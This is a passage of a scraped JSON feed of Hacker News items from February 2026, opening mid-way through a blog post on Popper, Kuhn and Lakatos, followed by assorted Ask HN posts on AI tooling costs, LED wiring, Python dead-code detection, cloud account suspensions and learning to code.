observations.\n\nFalsification has been a very influential philosophy.\nBut â€œfalsificationismâ€ didnâ€™t come from nowhere.\nFalsificationism was a response to the previous wave of philosophical thought called â€œpositivismâ€.\nA central theme of positivism is that knowledge is solely derived from knowledge or facts - humanityâ€™s knowledge of the world is always increasing.\nTheVienna Circlewas a group of logical positivists in the 1920s through 1960s who attempted to make a meta-theory for science.\nPopper certainly knew about them and his work on â€œverisimilitudeâ€ (proximity to truth), â€œcorroborationâ€ (evidence that supports or does not refute theory), and falsificationism was a rejection of some of these ideas.\n\nSimilarly, falsification is not the be-all-end-all of philosophy of science.\nThere were alternative philosophies at the time, likeThomas Kuhnâ€™sThe Structure of Scientific Revolutions.\n\nScientific revolutions\n\nKuhnâ€™s paradigmatic view discusses how different theories compete through their successes and failures.\nScientists, as a group, determine what a successful theory is.\nSome scientists will ardently support an older theory, despite itâ€™s inability to explain the results of new experiments.\nSome scientists will adventurously support a newer theory, even if it canâ€™t explain everything the older theory can because they believe it will be able to, eventually.\nOthers, waiting to be convinced, eventually pick one when enough people and evidence convince them.\nThere is a period where both old and new theories are viable and proponents of each theory try to interpret results of experiments that are difficult or impossible for the other theory to explain (â€œcommensurabilityâ€).\nAll of this leads to quite a lot of disagreement until a single paradigm emerges victorious (the â€œparadigm shiftâ€) and the field can return to its â€œnormal scienceâ€, which means asking interesting questions and doing regular work under the prevailing theory.\nKuhn didnâ€™t invent the word â€œparadigmâ€, but it certainly became popular as a result of his work.\n\nKuhnâ€™s work speaks to how scientists view theories given some logical framework to evaluate them.\nHe doesnâ€™t claim to have foundthelogic that scientists use.\nWhat matters to Kuhn is that there isalogic.\nFalsificationismmay bethe logic scientists use, but it doesnâ€™t have to be.\nAny philosophy that is understood by enough scientists in the field will do.\n\nWhat also matters is that the elevation of individual researchers to influential â€œleading scientistsâ€ may come from a distinct logic than what is used to evaluate scientific theories.\nYou can judge theories by one logic and leading scientists by another.\nThose leading scientists can go on to encourage a new philosophy for judging theories, which shapes future scientific research.\nQuantum theory is a good example of this.Niels Bohrheld radically different views of how subatomic particles behaved from predecessorsErnst MachandMax Planck, and from contemporaries like Einstein.\nEinstein may have beileved that â€œGod does not play diceâ€, but Bohrâ€™s Copenhagen interpretation of quantum mechanics has outlasted many of these criticisms, despite all the epistemological and physical issues it raises.\n\nImportantly, who is selected as the leading group of scientists that dictate the internal logicdoes notneed to be a logical choice, itself.\nTo paraphrase Planck, science advances one funeral at a time.\nCultural influence is a valid mechanism to select a leading group of scientists.\nTo quote someone Iâ€™m going to talk about next:\n\nKuhn came up with a highly original vision of irrationally changing rational authority.\n\nResearch programmes\n\nPopperâ€™s falsificationism and Kuhnâ€™s scientific revolutions inspired many subsequent philosophies.\nOne of the people who was inspired by these two philosophies wasImre Lakatos, the author of the above quote.\nLakatos greatly admired Popper and called him one of the greats of philosophy.\nHowever, Lakatos still found falsificationism too naive and paradigm shifts too irrational.\nLetâ€™s return to the example of gravity to see why falsificationism doesnâ€™t solve everything.\n\nAstronomers knew for hundreds of years that Newtonian gravity didnâ€™t explain certain observations, like Mercuryâ€™s orbit around the sun.\nNewtonian gravity had already been falsified, almost as soon as it was proposed.\nAnd yet, it hung around.\nWhy would scientists hold onto ideas they knew were false?\nAccording to Lakatos, there are two main reasons for this.\n\nThe first reason (called the â€œLakatosian defenceâ€) concerns running experiments in the real world.\nIf you have an underlying theory that you think is true, you need real experiments to test them.\nBut, as scientists know, real experiments require all kinds of engineering and planning and technology to get right.\nIf an experiment gives you results that contradict your theory, do what anyone would do who tries to avoid responsibility - blame the tools!\n\nItâ€™s necessary to question the experimental setup, confounding factors in your experimental design, and all kinds of other effects you havenâ€™t accounted for before attacking the theory.\nThis gives you some wiggle room to play defence and protect a theory.\nContradicting results donâ€™t necessarily falsify a theory, so you need not abandon it right away, like naive falsification suggests you should.\nIf there is a sufficient amount of contradictory evidence and you canâ€™t blame to tools, then Lakatosâ€™ defence has been thoroughly beaten and you need to abandon the theory.\nHowever, abandoning a theory isnâ€™t an easy thing because that theory often produces other predictionsthat are true.\nHow do you continue to explain those phenomena if youâ€™re forced to abandon the best theory you have that predicts them?\n\nThat brings us to the second reason Lakatos focused on, which concerns havingany underlying theory at allto work with.\nYes, physicists knew Newtonian gravity couldnâ€™t explain Mercuryâ€™s orbit.\nBut Newtonian physics was a monumental foundation to build on and you donâ€™t just let that go easily.\nIt wasnâ€™t until general relativity came around to pull the rug out fromeverythingthat anyone had sufficiently better theories thatstill explained everything that Newtonian physics did.\nIn philosophical terms, general relativity had more â€œtruth-contentâ€ than Newtonian physics, while still being â€œcommensurateâ€ with it.\nFalsificationism focuses on single theories, but like Kuhn noted in his work, scientists shift from one theory to another.\nLakatos understood that it doesnâ€™t make sense to only focus on a single theory - you need to focus on a series of theories, which he called a â€œresearch programmeâ€.\n\nA â€œresearch programmeâ€ can be understood as a series of theories, where all theories share some postulates that Lakatos called the â€œhard coreâ€.\nThis â€œhard coreâ€ is central to all tests of legitimacy, but each individual theory will vary in some way.\nThese variations between theories in the same programme are called the â€œauxillaryâ€.\nThe auxillary can build on the hard core, but they donâ€™t need to be certain logical derivations of the hard core.\nThe auxillary can also include facts from other scientific fields to include instrumentation, measurement practices, the interactions between well-established phenomena and new ground being explored with the hard core.\nThe auxillary is a bit more flexible than the hard core, and only once enough evidence has gathered with different auxillary theories can you really begin to poke at the hard core and evaluate its veracity.\n\nNewtonâ€™s three laws of motion comprised the hard core of Newtonian theory and his law of universal gravitation was an auxillary theory that worked incredibly well to describe the orbits of objects in space.\nEinsteinâ€™s special relativity encapsulated Newtonâ€™s laws under the banner of an â€œinertial reference frameâ€ and famously added an additional postulate t",
      "url": "https://jrhawley.ca/2026/02/03/philosophy-of-science-is-fascinating",
      "author_username": "jrhawley",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:11.614727",
      "published_at": "2026-02-03T08:49:19",
      "scraped_at": "2026-02-03T09:03:11.614744",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870939",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "0ed79f42c6e11dfe95d12fc1913ea5ca"
    },
    {
      "id": "dbb4da71a620705729b40593e3c91c32",
      "source": "hackernews",
      "source_id": "46870937",
      "title": "Ask HN: How do you manage long running AI conversations?",
      "content": "ASK HN: Iâ€™m trying to understand how people handle longer running AI conversations that span days or weeks and involve exploring multiple approaches.<p>Personally, I keep running into issues like:<p>- losing track of where a useful insight actually came from\n- meandering threads where good ideas get buried in tangents\n- having to re-explain context when returning later\n- branching ideas across multiple chats<p>Curious how others deal with this today.<p>Do you keep everything in one thread? Split aggressively? Export to notes&#x2F;docs? Something else entirely?<p>If you prefer to share your workflow privately would love to hear about it: fieldnotes6@gmail.com",
      "url": null,
      "author_username": "boh144",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:11.614829",
      "published_at": "2026-02-03T08:49:12",
      "scraped_at": "2026-02-03T09:03:11.614833",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46870937",
        "kids_count": 2,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "f4c7d1393372c27515beacba7c818ef0"
    },
    {
      "id": "2e96a2ee2686c85cde80fc623c377bc5",
      "source": "hackernews",
      "source_id": "46870933",
      "title": "Private Equity's Giant Software Bet Has Been Upended by AI",
      "content": "Private Equity's Giant Software Bet Has Been Upended by AI",
      "url": "https://www.bloomberg.com/news/articles/2026-02-03/private-equity-s-giant-software-bet-has-been-upended-by-ai",
      "author_username": "swexbe",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:11.715262",
      "published_at": "2026-02-03T08:49:09",
      "scraped_at": "2026-02-03T09:03:11.715276",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870933",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "d36b07519a44a1f90db6022c1bd0a704"
    },
    {
      "id": "9cfc45298c2e7d22e4fbbb299e3ca891",
      "source": "hackernews",
      "source_id": "46868715",
      "title": "Best practices for powering and wiring addressable LED strip installs?",
      "content": "Iâ€™ve been building installs with addressable LED strips (5V, 12V, 24V). The same few failure modes show up over and over: dim tails on long runs, random sparkle or flicker, and connectors that become the weak point.<p>A few practices that helped me most:<p>Treat power distribution as the first design task: plan injection points early, keep feeder wires short, and avoid pushing all current through one end.<p>Always share a solid ground between controller and strip, and keep the data path simple. When runs get longer or environments get noisy, a small series resistor near the data source and a proper level shift (3.3V to 5V) often improves stability.<p>Assume connectors are â€œconsumablesâ€: strain relief matters, waterproofing needs to stay serviceable, and high current runs deserve more conservative choices.<p>Iâ€™m curious what your most reliable rules of thumb are for injection spacing, branch fusing, and debugging when things go wrong. If you have a checklist or measurement approach you trust, Iâ€™d love to learn it.",
      "url": null,
      "author_username": "emmasuntech",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523692",
      "published_at": "2026-02-03T04:33:47",
      "scraped_at": "2026-02-03T09:03:12.523695",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46868715",
        "kids_count": 0,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "50839a90a6ca6bfa11e0125b8d5665d2"
    },
    {
      "id": "f51d89982d48135bb47664fc213efb1b",
      "source": "hackernews",
      "source_id": "46864515",
      "title": "Ask HN: OpenClaw users, what is your token spend?",
      "content": "Running OpenClaw with Anthrophic API and it burned through ~USD 50 in one day.<p>What are other OpenClaw users seeing? Anyone found effective ways to cut costs (model tiering, caching, etc.)?",
      "url": null,
      "author_username": "8cvor6j844qw_d6",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 11,
      "impressions_reposts": 0,
      "impressions_replies": 4,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523705",
      "published_at": "2026-02-02T19:29:56",
      "scraped_at": "2026-02-03T09:03:12.523708",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46864515",
        "kids_count": 3,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "63155e237defbf74aafc24b8c8b0cae2"
    },
    {
      "id": "c8b6be5476c8b1eef6ae229fe8eb6d6f",
      "source": "hackernews",
      "source_id": "46868640",
      "title": "My small SaaS got recommended my Google in the AI search overview",
      "content": "okay, so this is not so big to many of you , but today , i was just bored and tired of doing any marketing , cos nothing seemed to have been working. so i decided to do a search (i searched for quite a number of keywords) like error tracking for supabase , error tracking for next Js , but my saas didnt rank (if you dont know what im building , im working on a dead simple error tracker that notifies you when something breaks in prod, no bloated dashboards or config hell) , i built this cos sentry had too much noise and i just wanted something that lets me know when there&#x27;s an issue in prod.<p>so i decided to do a search on &quot;error tracking for shipfast(by marc lou)&quot; and guess what ?? Bugmail was the first recommended result , now i dont know how this worked, i mean ive done some seo and stuff but i wasnt expecting it , and now i feel like im back , which is funny cos i didnt make a sale , i didnt onboard a new user yet i feel like o have conquered , life of a founder , i guess<p>i just wanted to share this here, also if you have any advice on how to rank higher on GSC and how to nail this marketing thing , any advice or feedback will be valuable<p>in the meantime , incase you want to check out what ive built;<p>you can check it out here ; https:&#x2F;&#x2F;www.bugmail.site",
      "url": null,
      "author_username": "kaave",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 2,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523714",
      "published_at": "2026-02-03T04:25:01",
      "scraped_at": "2026-02-03T09:03:12.523716",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46868640",
        "kids_count": 2,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "172fc927e42712229bf1719028c60f3b"
    },
    {
      "id": "19fc80f71c724035342bc887476d6426",
      "source": "hackernews",
      "source_id": "46857444",
      "title": "Kernighan on Programming",
      "content": "&quot;Debugging is twice as hard as writing the code in the first place. Therefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it&quot;<p>This has been a timely PSA.",
      "url": null,
      "author_username": "chrisjj",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 150,
      "impressions_reposts": 0,
      "impressions_replies": 49,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523725",
      "published_at": "2026-02-02T10:57:32",
      "scraped_at": "2026-02-03T09:03:12.523727",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46857444",
        "kids_count": 11,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "bb282a0f44724f453072c008eaf2ee7c"
    },
    {
      "id": "bb0348dc46fe54b03994ee6570bbdd48",
      "source": "hackernews",
      "source_id": "46864047",
      "title": "Ask HN: What weird or scrappy things did you do to get your first users?",
      "content": "Hi everyone,<p>Iâ€™m building Persona, a platform to delegate email scheduling to AI. Lately, Iâ€™ve been working hard to get those first users on board, but itâ€™s been quite challenging.<p>Iâ€™ve already tried the typical strategies that everybody talks about: cold email, LinkedIn InMail, careful targeting, decent copy. Itâ€™s mostly been a dead end. Low open rates, almost no replies.<p>At this point, Iâ€™m not looking for the usual advice you see in blog posts or on reddit. Iâ€™m specifically curious about unconventional or non-obvious things that actually worked for you early on, especially things that felt a bit scrappy, weird, or counterintuitive at the time.<p>If youâ€™ve been through this phase, what genuinely worked and got you your first users?",
      "url": null,
      "author_username": "preston-kwei",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 11,
      "impressions_reposts": 0,
      "impressions_replies": 5,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523735",
      "published_at": "2026-02-02T18:49:08",
      "scraped_at": "2026-02-03T09:03:12.523737",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46864047",
        "kids_count": 2,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "f3216b2a7a59ce1a4688737afd9a6452"
    },
    {
      "id": "120277886841457c8bbf5af8b3fee5b8",
      "source": "hackernews",
      "source_id": "46867577",
      "title": "CiderStack â€“ Native macOS VM manager, pay once, no subscription",
      "content": "I&#x27;m one of the developers behind CiderStack.\nIt&#x27;s a local-first macOS VM tool for Apple devs who need clean installs, older Xcodes, or a safe place to test things without bricking their main machine.\nSpin up â†’ snapshot â†’ break things â†’ delete â†’ repeat.\nWhy no subscription?\nCiderStack runs on your hardware. It doesn&#x27;t need my servers. It doesn&#x27;t phone home. So why would you pay me every month?\nI&#x27;m tired of SaaS fees for tools that could easily be a one-time purchase. Tired of losing access to software because a card expired. Tired of workflows held hostage behind subscriptions.\nBuy it once. Own it forever. Free updates for the major version. That&#x27;s the deal.\nWho it&#x27;s for:<p>Solo devs testing across macOS versions without buying multiple Macs\nIT admins safely testing betas and MDM profiles before rollout\nCI&#x2F;CD teams spinning up ephemeral macOS runners\nHomelabbers with a rack of Mac minis (we built this for people like us)<p>14-day free trial, no account required. Just shipped v1.0.3 (found a few bugs pretty early on)\nHappy to answer questions.",
      "url": null,
      "author_username": "ciderdev",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 3,
      "impressions_reposts": 0,
      "impressions_replies": 2,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523745",
      "published_at": "2026-02-03T02:10:25",
      "scraped_at": "2026-02-03T09:03:12.523748",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46867577",
        "kids_count": 1,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "dcc114634b7f640cbd40051fc6f3618e"
    },
    {
      "id": "0c4e8fec2752861ec2150d04fb59f37c",
      "source": "hackernews",
      "source_id": "46866149",
      "title": "Ask HN: Where do all the web devs talk?",
      "content": "I&#x27;ve been using Twitter &#x2F; X for a good decade now, and while I&#x27;ve found it&#x27;s a great place to connect with native app dev communities (I&#x27;m well connected with the React Native scene), I really struggle to connect with any web devs.<p>There are a few big names like Adam Wathan who are pretty active on Twitter of course, but considering how widespread web dev is, I see precious few up-and-coming web devs coding in public.<p>So, where are they? I have explored BlueSky a bit, but again it feels a bit like tumbleweeds (though maybe that&#x27;s just my luck as a small account).<p>Are web devs more old-school, posting on bulletin boards and forums? Or is X still the answer, and I&#x27;m just getting aggressively packed into a different bubble?<p>â€¦ Or is it all realtime communication, like Slack and Discord, these days?",
      "url": null,
      "author_username": "LinguaBrowse",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 50,
      "impressions_reposts": 0,
      "impressions_replies": 48,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523760",
      "published_at": "2026-02-02T22:37:36",
      "scraped_at": "2026-02-03T09:03:12.523762",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46866149",
        "kids_count": 26,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "ff48fa061abdad1a266ed824b66cf76d"
    },
    {
      "id": "f5717f640e7033ea54082315803bb8e8",
      "source": "hackernews",
      "source_id": "46867190",
      "title": "Ask HN: Have you been fired because of AI?",
      "content": "Wanted to gather some stories about people who were fired because of AI. Not a generic &quot;reorg&quot;, what they say in the press release, but honestly, because of AI. Proves?",
      "url": null,
      "author_username": "s-stude",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 7,
      "impressions_reposts": 0,
      "impressions_replies": 12,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523771",
      "published_at": "2026-02-03T01:14:23",
      "scraped_at": "2026-02-03T09:03:12.523773",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46867190",
        "kids_count": 7,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "215810b1e17a13a7f93f7517d635d73b"
    },
    {
      "id": "e6a155aa5e60cff3231f8a6800e0267e",
      "source": "hackernews",
      "source_id": "46860544",
      "title": "GitHub Actions Have \"Major Outage\"",
      "content": "Currently the GitHub status page says there is a &quot;Major Outage&quot; for GitHub Actions.<p>https:&#x2F;&#x2F;www.githubstatus.com&#x2F;<p>This is as of 19:58 UTC &#x2F; 11:58 PST on 2-Feb-2026",
      "url": null,
      "author_username": "graton",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 51,
      "impressions_reposts": 0,
      "impressions_replies": 15,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523780",
      "published_at": "2026-02-02T14:57:40",
      "scraped_at": "2026-02-03T09:03:12.523782",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46860544",
        "kids_count": 7,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "a59d71ff080b7e35655386292b7c238b"
    },
    {
      "id": "d1fca4890663f29492fb343dc543819b",
      "source": "hackernews",
      "source_id": "46866473",
      "title": "Ask HN: Request limits vs. token limits for AI-powered apps?",
      "content": "Currently, Iâ€™m working on a web app for managing documents, databases, and whiteboardsâ€”the typical app that aims to be like Notion.<p>However, right now Iâ€™m facing the dilemma of creating a plan with AI usage limits, since the idea is to make it more agentic: able to edit and query context across an entire workspace and move it into a document, for example, maybe draw something on a whiteboard, etc. Still, I have the feeling that consumption could easily get out of hand. I plan to use DeepSeek for AI chat, but use Gemini 3 Flash for agentic usage and editing because itâ€™s more intelligent. Lately, Iâ€™ve seen how many core AI apps have shifted their pricing models from per-request pricing to a fixed usage limit, but Iâ€™m unsure whether thatâ€™s frowned upon, creates a less pleasant user experience, or maybe even gives the feeling that youâ€™re not getting what you paid for. So Iâ€™d like to hear some opinions on what decision I should make.",
      "url": null,
      "author_username": "JeduDev",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523788",
      "published_at": "2026-02-02T23:24:20",
      "scraped_at": "2026-02-03T09:03:12.523790",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46866473",
        "kids_count": 0,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "3bb76de262405e8b4a9c10653b413a41"
    },
    {
      "id": "11c388e4423aeac13c9907f558c15fb5",
      "source": "hackernews",
      "source_id": "46866428",
      "title": "Ask HN: Is anyone losing sleep over retry storms or partial API outages?",
      "content": "Iâ€™m working on infrastructure \nto solve retry storms and outages. Before I go further, I want to understand what people are actually doing today. Compare solutions and maybe help someone see potential solutions.\nThe problems:<p>Retry storms - API fails, your entire fleet retries independently, thundering herd makes it worse.<p>Partial outages - API is â€œupâ€ but degraded (slow, intermittent 500s). Health checks pass, requests suffer.<p>What Iâ€™m curious about:\n âˆ™ Whatâ€™s your current solution? (circuit breakers, queues, custom coordination, service mesh, something else?)\n âˆ™ How well does it work? What are the gaps?\n âˆ™ What scale are you at? (company size, # of instances, requests&#x2F;sec)<p>Iâ€™d love to hear whatâ€™s working, what isnâ€™t, and what you wish existed.",
      "url": null,
      "author_username": "rjpruitt16",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 2,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523803",
      "published_at": "2026-02-02T23:19:00",
      "scraped_at": "2026-02-03T09:03:12.523805",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46866428",
        "kids_count": 2,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "439636f4c832971a0bcdc5db430ab3f6"
    },
    {
      "id": "ddb18689948b60adfc75a9fc4ea655f1",
      "source": "hackernews",
      "source_id": "46866141",
      "title": "Ask HN: Why dead code detection in Python is harder than most tools admit",
      "content": "Iâ€™ve been thinking about why dead code detection (and static analysis in general) feels so unreliable in Python compared to other languages. I understand that Python is generally dynamic in nature.<p>In theory it should be simple(again in theory): parse the AST, build a call graph, find symbols with zero references. In practice it breaks down quickly because of many things like:<p>1. dynamic dispatch (getattr, registries, plugin systems)<p>2. framework entrypoints (Flask&#x2F;FastAPI routes, Django views, pytest fixtures)<p>3. decorators and implicit naming conventions<p>4. code invoked only via tests or runtime configuration<p>Most tools seem to pick one of two bad tradeoffs:<p>1. be conservative and miss lots of genuinely dead code<p>or<p>2. be aggressive and flag false positives that people stop trusting<p>Whatâ€™s worked best for me so far is treating the code as sort of a confidence score, plus some layering in limited runtime info (e.g. what actually executed during tests) instead of relying on 100% static analysis.<p>Curious how others handle this in real codebases..<p>Do yall just accept false positives? or do yall ignore dead code detection entirely? have anyone seen approaches that actually scale? I am aware that sonarqube is very noisy.<p>I built a library with a vsce extension, mainly to explore these tradeoffs (link below if relevant), but Iâ€™m more interested in how others think about the problem. Also hope I&#x27;m in the right channel<p>Repo for context: https:&#x2F;&#x2F;github.com&#x2F;duriantaco&#x2F;skylos",
      "url": null,
      "author_username": "duriantaco",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 3,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523813",
      "published_at": "2026-02-02T22:36:03",
      "scraped_at": "2026-02-03T09:03:12.523820",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46866141",
        "kids_count": 0,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "359e70ac983ddaad990eb250251af81c"
    },
    {
      "id": "0ac338c14c61ec4f2f0b325c78d1320c",
      "source": "hackernews",
      "source_id": "46839375",
      "title": "Google Cloud suspended my account for 2 years, only automated replies",
      "content": "My Google account has been suspended from GCP since March 2024.<p>I have submitted multiple appeals through ts-consult@google.com over 2 years. Every time I get the same automated template asking me to explain, I reply with details, then nothing. No human ever responds.<p>Case: #1-8622000037271<p>Timeline:\n  - March 2024: Suspended, appeal submitted\n  - April 2024: Automated requests for info, I replied\n  - Nov 2024: More automated emails, I replied again\n  - Dec 2024 - now: Complete silence<p>I am a CS researcher at UC Berkeley. This has seriously impacted my work.<p>Has anyone successfully gotten Google to review a GCP suspension appeal? How do you reach a human?",
      "url": null,
      "author_username": "andylizf",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 156,
      "impressions_reposts": 0,
      "impressions_replies": 89,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523830",
      "published_at": "2026-01-31T13:41:36",
      "scraped_at": "2026-02-03T09:03:12.523832",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46839375",
        "kids_count": 21,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "a3f2c8f9daaec8bc37b6135661eea57d"
    },
    {
      "id": "995f10c9ccf64276b709ab6e38dee226",
      "source": "hackernews",
      "source_id": "46865589",
      "title": "Ask HN: Interest in low cost / fast container registry?",
      "content": "Hi all,<p>I&#x27;ve noticed that container images are getting bigger (particularly with AI related images). I was annoyed the pricing of my cloud provider so I quickly whipped something up.<p>It uses Cloudflare R2 + workers which is the lowest cost way to do this (AFAICT). However, due to how Cloudflare works, I had to change the push side to do it (pull side remains the same). I don&#x27;t mind this personally (simplifies things a lot for typical use cases imo), but not sure what others would think. I am dog-fooding it right now and it is working fine but wondering if there is any interest in the community more broadly? As a SaaS, $5&#x2F;month would cover 100GiB storage easily. Egress has a non-zero associated cost, but I think would be noise for most use cases. Alternately it could be something you run in your own CF account perhaps. It is extremely fast as well since it leverages Cloudflare&#x27;s edge &#x2F; CDN. So, faster, cheaper but a necessarily a little bit different to take advantage of things.<p>Anyway, if anyone has any thoughts &#x2F; feedback on this approach, please let me know.",
      "url": null,
      "author_username": "osigurdson",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523842",
      "published_at": "2026-02-02T21:23:00",
      "scraped_at": "2026-02-03T09:03:12.523844",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46865589",
        "kids_count": 0,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "911e622e234bb7a13a1f0a1d35f1a061"
    },
    {
      "id": "8a176ced3f12ef0334a8a7407c700436",
      "source": "hackernews",
      "source_id": "46866165",
      "title": "Ask HN: Anyone else struggle with how to learn coding in the AI era?",
      "content": "I&#x27;m someone who got into building&#x2F;programming in early 2025, when vibe coding tools became more usable. Since then, I&#x27;d like to think that I have developed a lot as a programmer, but I still have this deep sense of imposter syndrome &#x2F; worry that AI is too much of a crutch and I&#x27;m not really learning.<p>I have shipped a few projects, I always review AI-suggested code, do daily coding practice without AI, watch youtube videos, etc. but still don&#x27;t know if I&#x27;m striking the right balance or whether I can really call myself a programmer.<p>I often see people say that the solution is to just fully learn to code without AI, (i.e, go &quot;cold turkey&quot;), which may be the best, but I wonder if the optimal path is somewhere in between given that AI is clearlly changing the game here in terms of what it means to be a programmer.<p>I&#x27;m curious how you have all handled this balancing act in the past few years. More concretely, what strategies do you use to both be efficient and able to ship &#x2F; move quickly while ensuring you are also taking the time to really process and understand and learn what you are doing?",
      "url": null,
      "author_username": "44Bulldog",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 40,
      "impressions_reposts": 0,
      "impressions_replies": 57,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523855",
      "published_at": "2026-02-02T22:39:12",
      "scraped_at": "2026-02-03T09:03:12.523857",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46866165",
        "kids_count": 35,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "8c0e48fc72e7a198a549a71cfa8d1fda"
    },
    {
      "id": "049e4fc0b8911e182fcc0121bcfc573c",
